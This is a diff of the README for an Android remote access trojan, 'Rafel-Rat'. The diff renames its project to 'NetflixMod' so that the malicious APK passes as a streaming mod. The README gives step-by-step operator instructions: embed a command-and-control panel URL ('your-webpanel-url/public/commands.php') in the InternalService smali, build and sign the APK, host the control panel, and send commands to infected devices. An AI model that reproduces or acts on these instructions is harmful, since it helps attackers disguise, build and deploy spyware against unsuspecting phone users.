@@ -37,16 +37,16 @@ OR
 ---  
 ### Building Apk With Android Studio
 
-1. Open Project ***Lite_Browsercode*** in Android Studio 
+1. Open Project ***NetflixMod*** in Android Studio 
 2.  Put the `command.php` link of server in InternalService.class class
 3.  Build the Project
 4.  Zipalign and sign the Apk...
 ---
 ### Building Apk with ApkEasyTool:
 
-1. Navigate to ***\Lite_Browser\smali\com\velociraptor\raptor*** 
+1. Navigate to ***\NetflixMod\smali\com\velociraptor\raptor*** 
 2. Open InternalService.smali 
-3. Replace this with your Panel Url ***const-string v0, "https://your-webpanel-url/commands.php"***
+3. Replace this with your Panel Url ***const-string v0, "https://your-webpanel-url/public/commands.php"***
 ---
 ### Building Server 
 1. Upload Files in server Folder to Your HostingPanel
@@ -55,11 +55,11 @@ OR
 4. Note : Make Sure your webhosting site uses Https and should have valid connection...I recommend 000webhost.com
 5. You can now use panel to send commands and also refresh after it
 ---
-### Rafel-Rat in Action[  Code Will Be Updated Soon] :
+### Rafel-Rat in Action :
 
 <img width="780" height="450" src="https://github.com/swagkarna/Rafel-Rat/blob/main/2021-03-23-23-26-30_XZXbWfvD_YPKB.gif"></img>
 ---
-## Screenshots
+## Screenshots[old]
 | | | |
 |:-------------------------:|:-------------------------:|:-------------------------:|
 |<a href="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(70).png?raw=true"> <img width="2000" src="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(70).png?raw=true"> Panel-1</a> | <a href="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(71).png?raw=true"> <img width="2000" src="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(71).png?raw=true"> Panel-2</a> |<a href="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(72).png?raw=trueg"> <img width="2000" src="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(72).png?raw=true"> Panel-3 </a>||
